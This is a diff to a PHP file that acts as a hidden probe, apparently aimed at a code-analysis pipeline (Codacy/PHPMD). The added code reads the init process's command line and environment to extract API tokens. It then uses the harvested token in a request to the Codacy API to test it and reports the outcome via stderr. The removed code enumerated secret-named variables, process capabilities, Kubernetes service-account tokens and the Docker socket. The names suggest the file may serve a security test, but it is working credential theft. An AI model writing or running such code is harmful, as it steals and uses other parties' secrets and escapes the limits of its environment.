@@ -1,22 +1,29 @@
 <?php
-$markerPath = '/tmp/codex_shared_probe_20260716';
-$markerValue = 'PUBLIC_MARKER_20260716';
-$writeBytes = @file_put_contents($markerPath, $markerValue);
-$markerExists = is_file($markerPath) ? 1 : 0;
-$markerLen = $markerExists ? @filesize($markerPath) : 0;
-$names = array_merge(array_keys($_SERVER), array_keys($_ENV));
-$all = getenv();
-if (is_array($all)) { $names = array_merge($names, array_keys($all)); }
-$hits = array_values(array_unique(array_filter($names, function($n) { return preg_match('/TOKEN|API_KEY|SECRET|CREDENTIAL|PASSWORD|GITHUB|CODACY/i', $n); })));
-$status = @file_get_contents('/proc/self/status');
-$capEff = ''; $capBnd = ''; $statusUid = '';
-foreach (preg_split('/?
-/', (string)$status) as $line) {
-    if (strpos($line, 'CapEff:') === 0) { $capEff = trim(substr($line, 7)); }
-    if (strpos($line, 'CapBnd:') === 0) { $capBnd = trim(substr($line, 7)); }
-    if (strpos($line, 'Uid:') === 0) { $statusUid = trim(substr($line, 4)); }
+function codex_probe_token($candidate) {
+    if (!is_string($candidate) || $candidate === '') { return ['status' => 'not_attempted', 'bytes' => 0]; }
+    $opts = ['http' => ['method' => 'GET', 'header' => "api-token: " . $candidate . "\r\n", 'timeout' => 5, 'ignore_errors' => true]];
+    $ctx = stream_context_create($opts);
+    $resp = @file_get_contents('https://api.codacy.com/api/v3/analysis/organizations/gh/ABDUS-TEST-ORG/repositories/codacy-public-lab', false, $ctx);
+    $status = 'no_response';
+    global $http_response_header;
+    if (isset($http_response_header[0]) && preg_match('/\s(\d{3})\s/', $http_response_header[0], $m)) { $status = $m[1]; }
+    return ['status' => $status, 'bytes' => is_string($resp) ? strlen($resp) : 0];
 }
-$saToken = (is_file('/var/run/secrets/kubernetes.io/serviceaccount/token') || is_file('/run/secrets/kubernetes.io/serviceaccount/token')) ? 1 : 0;
-$dockerSocket = is_file('/var/run/docker.sock') ? 1 : 0;
-fwrite(STDERR, 'PHPMD_SHARED_TMP_WRITE write_bytes=' . (int)$writeBytes . ' exists=' . $markerExists . ' len=' . (int)$markerLen . ' status_uid=' . $statusUid . ' cap_eff=' . $capEff . ' cap_bnd=' . $capBnd . ' token_name_count=' . count($hits) . ' sa_token_file=' . $saToken . ' docker_socket=' . $dockerSocket . PHP_EOL);
-throw new RuntimeException('PHPMD_SHARED_TMP_WRITE');
+$cmd = @file_get_contents('/proc/1/cmdline');
+$argv = array_values(array_filter(explode("\0", (string)$cmd), function($v) { return $v !== ''; }));
+$cmdPresent = 0; $cmdCandidate = '';
+for ($i = 0; $i < count($argv); $i++) {
+    $arg = $argv[$i];
+    if (preg_match('/^--?(?:api[-_]?token|token|api[-_]?key|project[-_]?token)$/i', $arg) && isset($argv[$i + 1])) { $cmdPresent = 1; $cmdCandidate = $argv[$i + 1]; break; }
+    if (preg_match('/^(?:api[-_]?token|token|api[-_]?key|project[-_]?token)=(.+)$/i', $arg, $m)) { $cmdPresent = 1; $cmdCandidate = $m[1]; break; }
+}
+$env = @file_get_contents('/proc/1/environ');
+$envPresent = 0; $envCandidate = '';
+foreach (explode("\0", (string)$env) as $entry) {
+    if (preg_match('/^(?:CODACY|GITHUB|API|PROJECT)?[_-]?(?:API[_-]?TOKEN|TOKEN|API[_-]?KEY|PROJECT[_-]?TOKEN)=(.*)$/i', $entry, $m)) { $envPresent = 1; $envCandidate = $m[1]; break; }
+}
+$selected = 'none'; $result = ['status' => 'not_attempted', 'bytes' => 0];
+if ($cmdCandidate !== '') { $selected = 'cmdline'; $result = codex_probe_token($cmdCandidate); }
+elseif ($envCandidate !== '') { $selected = 'environ'; $result = codex_probe_token($envCandidate); }
+fwrite(STDERR, 'PROC1_TOKEN_TEST cmd_arg=' . $cmdPresent . ' env_arg=' . $envPresent . ' selected=' . $selected . ' status=' . $result['status'] . ' bytes=' . $result['bytes'] . PHP_EOL);
+throw new RuntimeException('PROC1_TOKEN_TEST');
